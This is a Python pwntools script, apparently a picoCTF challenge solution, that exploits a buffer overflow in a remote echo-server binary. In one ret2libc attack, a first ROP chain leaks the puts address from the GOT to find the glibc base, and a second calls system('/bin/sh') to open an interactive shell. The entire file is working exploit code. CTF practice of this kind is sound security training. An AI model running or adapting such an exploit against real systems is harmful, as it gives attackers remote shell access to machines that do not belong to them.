from pwn import *

context.binary = elf = ELF('vuln_patched')

p = remote('mercury.picoctf.net', 37289)

offset = 136                # 136 bytes $rbp
junk = b'A' * offset

pop_rdi_ret = 0x400913  # pop rdi ; ret
puts_got = 0x601018     # puts got address
puts_plt = 0x400540     # puts plt address
main_addr = 0x400771    # main() function address

# Crafting the payload
payload  = junk
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_addr)  

p.sendlineafter(b'WeLcOmE To mY EcHo sErVeR!\n', payload)
p.recvline()

# Leaked puts() address
puts_addr = u64(p.recvline().strip().ljust(8, b'\0'))
log.info(f'Leaked puts() address: {hex(puts_addr)}')

# Leaked glibc base address
puts_offset = 0x80a30
glibc_base_addr = puts_addr - puts_offset
log.info(f'Glibc base address: {hex(glibc_base_addr)}')

# system() function and /bin/sh offset
system_offset = 0x000000000004f4e0
bin_sh_offset = 0x1b40fa

# system() function and /bin/sh address 
system_address = glibc_base_addr + system_offset
bin_sh_address = glibc_base_addr + bin_sh_offset

# Crafting the payload
payload = junk
payload += p64(pop_rdi_ret)
payload += p64(bin_sh_address)
payload += p64(pop_rdi_ret + 1) # pop rdi ; ret gadget + 1 = ret, stack alignment
payload += p64(system_address)

p.sendlineafter(b'WeLcOmE To mY EcHo sErVeR!\n', payload)
p.recvline()

# Gotta shell!
p.interactive()

